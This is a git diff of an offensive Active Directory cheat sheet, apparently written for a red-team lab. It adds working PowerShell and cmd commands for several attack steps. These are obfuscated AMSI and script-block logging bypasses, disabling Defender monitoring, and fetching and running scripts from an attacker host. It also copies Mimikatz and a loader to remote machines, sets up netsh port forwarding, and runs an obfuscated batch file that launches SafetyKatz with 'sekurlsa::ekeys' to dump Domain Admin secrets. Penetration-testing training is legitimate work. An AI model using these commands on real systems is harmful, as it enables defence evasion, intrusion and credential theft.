@@ -1,4 +1,73 @@
 # CheatSheet
+## General
+Connect to a machine with Administrator privileges
+```
+Enter-PSSession -Computername <computername>
+$sess = New-PSSession -Computername <computername>
+Enter-PSSession $sess
+```
+
+Execute commands on remote machines
+```
+Invoke-Command -Computername <computername> -Scriptblock {whoami} 
+Invoke-Command -Scriptblock {whoami} $sess
+```
+
+Load Script on a machine
+```
+Invoke-Command -Computername <computername> -FilePath <path>
+Invoke-Command -FilePath <path> $sess
+```
+
+Download and Load script on a machine
+```
+iex (iwr http://<my_ip>/<scriptname> -UseBasicParsing)
+```
+
+### Create a port forwarding 
+```
+"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<my_ip>"
+```
+
+### Copy a Script on Another Server
+Powershell command
+```
+Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
+```
+
+Cmd command
+```
+echo F | xcopy <file_to_copy> \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+
+### AMSI Bypass
+The first one could be detected
+```
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+```
+$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
+```
+```
+Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
+```
+
+### Disable AV monitoring
+Powershell command to disable AV
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### Enumerate Language mode and Applocker
+Enumerate the Language Mode
+```
+$ExecutionContext.SessionState.LanguageMode
+```
+
+Enumerate the Applocker policies
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
 ## Enumeration
 ### Domain Enumeration Using PowerView.ps1
 Enumeration of domain information
@@ -133,7 +202,6 @@ Perform the enumeration
 Find-PSRemotingLocalAdminAccess
 ```
 
-### 
 
 ## Reverse-Shells
 Command to download and execute a reverse-shell
@@ -170,70 +238,111 @@ user: neo4j
 password: bloodhound
 
 ## Lateral Movement
-### General
-Connect to a machine with Administrator privileges
+Below a list of techniques that may be useful to escalate to domain admin performing a credential dump or exploiting an available Domain Admin session. 
+
+### Derivative Local Admin to dump credentials
+Using winrs to connect on remote machine on which the user has local admin privileges
+
 ```
-Enter-PSSession -Computername <computername>
-$sess = New-PSSession -Computername <computername>
-Enter-PSSession $sess
+winrs -r:<machine_name> cmd
 ```
 
-Execute commands on remote machines
+Check whether AMSI and ScriptBlocking is enabled, this command provides constrains also for scripts
 ```
-Invoke-Command -Computername <computername> -Scriptblock {whoami} 
-Invoke-Command -Scriptblock {whoami} $sess
-```
-
-Load Script on a machine
-```
-Invoke-Command -Computername <computername> -FilePath <path>
-Invoke-Command -FilePath <path> $sess
+reg query HKLM\Software\Policies\Microsoft\Windows\SRVP2
 ```
 
-Download and Load script on a machine
+CLM can block the script execution in specific locations, check where scripts can be executed
 ```
-iex (iwr http://<my_ip>/<scriptname> -UseBasicParsing)
-```
-
-### Copy a Script on Another Server
-Powershell command
-```
-Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
+Get-ApplockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
-Cmd command
+Disable ScriptBlocking
 ```
-echo F | xcopy <file_to_copy> \\dcorp-dc\C$\Users\Public\Loader.exe /Y
-```
-
-### AMSI Bypass
-The first one could be detected
-```
-sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
-```
-```
-$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
-```
-```
-Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der')).
+	"gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+
+	'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
 ```
 
-### Disable AV monitoring
-Powershell command to disable AV
+Copy Mimikatz in 'Program Files' folder on the remote machine using powershell
 ```
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
-
-### Enumerate Language mode and Applocker
-Enumerate the Language Mode
-```
-$ExecutionContext.SessionState.LanguageMode
+Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\<remote_machine.domain>\c$\'Program Files'
 ```
 
-Enumerate the Applocker policies
+Load Mimikatz
 ```
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+. .\Invoke-MimiEx.ps1 
 ```
+
+### Exploiting a Domain Admin session
+Bypass the ScriptBlocking
+```
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;   (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+The command can also be run using a reverse-shell
+```
+iex (iwr http://<my_ip>/sbloggingbypass.txt -UseBasicParsing)
+```
+
+Download PowerView.ps1
+```
+iex ((New-Object Net.Webclient).DownloadString('http://<my_ip>/PowerView.ps1'))
+```
+
+Enumerate Domain Admin Sessions
+```
+Find-DomainUserLocation
+```
+
+Download the file Loader.exe which will be useful to load malicious payloads
+```
+iwr http://<my_ip>/Loader.exe -OutFile C:\Users\Public\Loader.exe
+```
+
+Copy the file Loader.exe to a remote machine
+```
+echo F | xcopy C:\Users\Public\Loader.exe \\<machine_name>\C$\Users\Public\Loader.exe
+```
+
+Create a portproxy forwarding using netsh
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<my_ip>"
+```
+
+On the machine with the session opened as Domain Admin run the following Safety.bat file 
+```
+@echo off
+set "z=s"
+set "y=y"
+set "x=e"
+set "w=k"
+set "v=e"
+set "u=:"
+set "t=:"
+set "s=a"
+set "r=s"
+set "q=l"
+set "p=r"
+set "o=u"
+set "n=k"
+set "m=e"
+set "l=s"
+set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
+echo %Pwn%
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn% exit
+```
+
+**Note:** in this case the %Pwn% variable is the string "sekurlsa::ekeys" to dump the session secrets
+
+Performing the command 
+```
+$null | winrs -r:dcorp-mgmt "cmd C:\Users\Public\Safety.bat"
+```
+
+
+
+
 
 
 
